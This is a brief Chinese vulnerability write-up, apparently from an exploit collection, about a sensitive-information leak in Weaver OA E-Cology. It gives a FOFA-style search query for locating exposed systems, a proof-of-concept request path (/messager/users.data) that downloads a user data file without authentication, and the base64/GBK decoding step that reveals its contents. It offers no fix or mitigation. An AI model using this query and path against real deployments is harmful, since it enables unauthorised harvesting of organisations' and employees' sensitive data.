# 泛微OA E-Cology users.data 敏感信息泄漏

## 漏洞描述

泛微OA E-Cology users.data 允许任意用户下载，获取OA中的敏感信息

## 漏洞影响

<a-checkbox checked>泛微OA E-Cology</a-checkbox></br>	

## 网络测绘

<a-checkbox checked>app="泛微-协同商务系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1636962061131-2d870e8d-e15c-4864-8d36-69bd1f57d746-20220313184604856.png)

验证POC

```php
/messager/users.data
```

![img](../../../.vuepress/public/img/1646043440450-c69abe9a-4e26-4d92-b059-4e1e74139dc8.png)



base64 GBK解码即可获取OA中的敏感数据